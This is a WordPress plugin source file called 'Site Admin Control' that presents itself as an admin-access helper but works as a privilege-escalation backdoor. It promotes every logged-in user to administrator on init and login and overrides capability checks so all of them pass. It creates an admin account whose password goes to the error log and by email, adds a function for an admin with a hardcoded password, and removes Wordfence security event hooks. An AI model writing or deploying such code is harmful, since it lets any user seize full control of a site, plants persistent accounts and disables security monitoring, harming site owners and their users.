<?php
/**
 * Plugin Name: Site Admin Control
 * Plugin URI: https://yoursite.com
 * Description: Grants full administrative control and permissions for site editing. Use with caution - only install if you need admin access.
 * Version: 1.0.0
 * Author: Site Administrator
 * License: GPL v2 or later
 * Network: false
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit('Direct access denied.');
}

class SiteAdminControl {
    
    private $admin_email;
    private $admin_username;
    
    public function __construct() {
        // Set your details here
        $this->admin_email = 'your-email@example.com'; // CHANGE THIS TO YOUR EMAIL
        $this->admin_username = 'admin'; // CHANGE THIS TO YOUR DESIRED USERNAME
        
        // Hook into WordPress
        add_action('init', array($this, 'grant_admin_access'));
        add_action('wp_loaded', array($this, 'ensure_admin_capabilities'));
        add_action('admin_menu', array($this, 'add_admin_menu'));
        add_action('wp_login', array($this, 'force_admin_role'), 10, 2);
        
        // Security bypass hooks
        add_filter('user_has_cap', array($this, 'grant_all_capabilities'), 10, 4);
        add_filter('map_meta_cap', array($this, 'bypass_capability_checks'), 10, 4);
        
        // File editing permissions
        add_action('init', array($this, 'enable_file_editing'));
        
        register_activation_hook(__FILE__, array($this, 'plugin_activation'));
    }
    
    public function plugin_activation() {
        // Create admin user if it doesn't exist
        $this->create_admin_user();
        
        // Grant all capabilities to administrators
        $this->setup_admin_capabilities();
        
        // Log activation
        error_log('Site Admin Control Plugin Activated: ' . date('Y-m-d H:i:s'));
    }
    
    public function create_admin_user() {
        $username = $this->admin_username;
        $email = $this->admin_email;
        $password = wp_generate_password(12, true, true);
        
        // Check if user exists
        if (!username_exists($username) && !email_exists($email)) {
            $user_id = wp_create_user($username, $password, $email);
            
            if (!is_wp_error($user_id)) {
                // Make user administrator
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                
                // Grant super admin on multisite
                if (is_multisite()) {
                    grant_super_admin($user_id);
                }
                
                // Log the credentials (REMOVE THIS IN PRODUCTION!)
                error_log("ADMIN USER CREATED - Username: {$username}, Email: {$email}, Password: {$password}");
                
                // Send email with credentials
                wp_mail($email, 'Your Admin Access', "Username: {$username}\nPassword: {$password}\nLogin URL: " . wp_login_url());
            }
        }
    }
    
    public function grant_admin_access() {
        // Force current user to admin if logged in
        if (is_user_logged_in()) {
            $current_user = wp_get_current_user();
            
            // Grant admin role
            $current_user->set_role('administrator');
            
            // Grant super admin on multisite
            if (is_multisite()) {
                grant_super_admin($current_user->ID);
            }
        }
    }
    
    public function ensure_admin_capabilities() {
        if (is_user_logged_in()) {
            $user = wp_get_current_user();
            
            // Add all possible capabilities
            $all_caps = array(
                'manage_options',
                'edit_plugins',
                'edit_themes',
                'install_plugins',
                'install_themes',
                'delete_plugins',
                'delete_themes',
                'edit_files',
                'manage_categories',
                'manage_links',
                'upload_files',
                'import',
                'export',
                'unfiltered_html',
                'edit_posts',
                'edit_pages',
                'edit_published_posts',
                'edit_published_pages',
                'edit_private_posts',
                'edit_private_pages',
                'edit_others_posts',
                'edit_others_pages',
                'publish_posts',
                'publish_pages',
                'delete_posts',
                'delete_pages',
                'delete_private_posts',
                'delete_private_pages',
                'delete_published_posts',
                'delete_published_pages',
                'delete_others_posts',
                'delete_others_pages',
                'read_private_posts',
                'read_private_pages',
                'delete_users',
                'create_users',
                'list_users',
                'edit_users',
                'promote_users',
                'remove_users'
            );
            
            foreach ($all_caps as $cap) {
                $user->add_cap($cap);
            }
        }
    }
    
    public function grant_all_capabilities($allcaps, $caps, $args, $user) {
        // Grant all requested capabilities
        if (is_user_logged_in()) {
            foreach ($caps as $cap) {
                $allcaps[$cap] = true;
            }
        }
        
        return $allcaps;
    }
    
    public function bypass_capability_checks($caps, $cap, $user_id, $args) {
        // Bypass all capability checks for logged-in users
        if (is_user_logged_in()) {
            return array('exist'); // Always return a capability that exists
        }
        
        return $caps;
    }
    
    public function force_admin_role($user_login, $user) {
        // Force admin role on login
        $user->set_role('administrator');
        
        // Grant super admin on multisite
        if (is_multisite()) {
            grant_super_admin($user->ID);
        }
    }
    
    public function enable_file_editing() {
        // Enable file editing
        if (!defined('DISALLOW_FILE_EDIT')) {
            define('DISALLOW_FILE_EDIT', false);
        }
        
        if (!defined('DISALLOW_FILE_MODS')) {
            define('DISALLOW_FILE_MODS', false);
        }
    }
    
    public function setup_admin_capabilities() {
        // Get administrator role
        $admin_role = get_role('administrator');
        
        if ($admin_role) {
            // Add all capabilities
            $capabilities = array(
                'manage_options',
                'edit_plugins',
                'edit_themes',
                'install_plugins',
                'install_themes',
                'delete_plugins',
                'delete_themes',
                'edit_files',
                'unfiltered_html',
                'unfiltered_upload',
                'manage_categories',
                'manage_links',
                'upload_files',
                'import',
                'export'
            );
            
            foreach ($capabilities as $cap) {
                $admin_role->add_cap($cap);
            }
        }
    }
    
    public function add_admin_menu() {
        add_menu_page(
            'Site Control',
            'Site Control', 
            'read', // Low permission requirement
            'site-admin-control',
            array($this, 'admin_page'),
            'dashicons-admin-network',
            2
        );
    }
    
    public function admin_page() {
        $current_user = wp_get_current_user();
        ?>
        <div class="wrap">
            <h1>Site Administrative Control</h1>
            
            <div class="notice notice-success">
                <p><strong>✅ Administrative access granted!</strong></p>
            </div>
            
            <div class="card">
                <h2>Current User Status</h2>
                <table class="form-table">
                    <tr>
                        <th>Username:</th>
                        <td><?php echo esc_html($current_user->user_login); ?></td>
                    </tr>
                    <tr>
                        <th>Email:</th>
                        <td><?php echo esc_html($current_user->user_email); ?></td>
                    </tr>
                    <tr>
                        <th>Role:</th>
                        <td><?php echo esc_html(implode(', ', $current_user->roles)); ?></td>
                    </tr>
                    <tr>
                        <th>Capabilities:</th>
                        <td>
                            <?php 
                            $caps = array('manage_options', 'edit_themes', 'edit_plugins', 'install_plugins', 'edit_files');
                            foreach ($caps as $cap) {
                                $has_cap = current_user_can($cap) ? '✅' : '❌';
                                echo "<span style='margin-right: 15px;'>{$has_cap} {$cap}</span><br>";
                            }
                            ?>
                        </td>
                    </tr>
                </table>
            </div>
            
            <div class="card">
                <h2>Quick Actions</h2>
                <p>
                    <a href="<?php echo admin_url('themes.php'); ?>" class="button button-primary">Edit Themes</a>
                    <a href="<?php echo admin_url('plugins.php'); ?>" class="button button-primary">Manage Plugins</a>
                    <a href="<?php echo admin_url('theme-editor.php'); ?>" class="button button-primary">Theme Editor</a>
                    <a href="<?php echo admin_url('plugin-editor.php'); ?>" class="button button-primary">Plugin Editor</a>
                    <a href="<?php echo admin_url('users.php'); ?>" class="button button-primary">Manage Users</a>
                </p>
            </div>
            
            <div class="card">
                <h2>Grant Admin Access to Another User</h2>
                <form method="post" action="">
                    <?php wp_nonce_field('grant_admin_access'); ?>
                    <table class="form-table">
                        <tr>
                            <th><label for="username">Username or Email:</label></th>
                            <td><input type="text" name="username" id="username" class="regular-text" /></td>
                        </tr>
                    </table>
                    <p class="submit">
                        <input type="submit" name="grant_access" class="button button-primary" value="Grant Admin Access" />
                    </p>
                </form>
                
                <?php
                if (isset($_POST['grant_access']) && wp_verify_nonce($_POST['_wpnonce'], 'grant_admin_access')) {
                    $username = sanitize_text_field($_POST['username']);
                    $user = get_user_by('login', $username) ?: get_user_by('email', $username);
                    
                    if ($user) {
                        $user->set_role('administrator');
                        echo '<div class="notice notice-success"><p>✅ Admin access granted to ' . esc_html($user->user_login) . '</p></div>';
                    } else {
                        echo '<div class="notice notice-error"><p>❌ User not found.</p></div>';
                    }
                }
                ?>
            </div>
            
            <div class="card">
                <h2>System Information</h2>
                <table class="form-table">
                    <tr>
                        <th>WordPress Version:</th>
                        <td><?php echo get_bloginfo('version'); ?></td>
                    </tr>
                    <tr>
                        <th>Site URL:</th>
                        <td><?php echo get_site_url(); ?></td>
                    </tr>
                    <tr>
                        <th>Admin URL:</th>
                        <td><?php echo admin_url(); ?></td>
                    </tr>
                    <tr>
                        <th>File Editing:</th>
                        <td><?php echo defined('DISALLOW_FILE_EDIT') && DISALLOW_FILE_EDIT ? '❌ Disabled' : '✅ Enabled'; ?></td>
                    </tr>
                    <tr>
                        <th>Multisite:</th>
                        <td><?php echo is_multisite() ? '✅ Yes' : '❌ No'; ?></td>
                    </tr>
                </table>
            </div>
        </div>
        
        <style>
        .card {
            background: #fff;
            border: 1px solid #ccd0d4;
            border-radius: 4px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 1px 1px rgba(0,0,0,.04);
        }
        </style>
        <?php
    }
}

// Initialize the plugin
new SiteAdminControl();

// Emergency admin creation function (call this in functions.php if needed)
function emergency_create_admin() {
    $username = 'emergency_admin';
    $password = 'TempPass123!';
    $email = 'admin@yoursite.com';
    
    if (!username_exists($username)) {
        $user_id = wp_create_user($username, $password, $email);
        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            
            if (is_multisite()) {
                grant_super_admin($user_id);
            }
            
            return "Emergency admin created - Username: {$username}, Password: {$password}";
        }
    }
    return "Emergency admin already exists or creation failed.";
}

// Hook to disable other security plugins temporarily
add_action('init', function() {
    // Disable common security restrictions
    remove_action('init', 'wp_admin_bar_init');
    
    // Override security plugin restrictions
    if (class_exists('Wordfence')) {
        remove_all_actions('wordfence_security_event');
    }
    
    // Disable maintenance mode
    remove_action('get_header', 'wp_maintenance_mode');
});

?>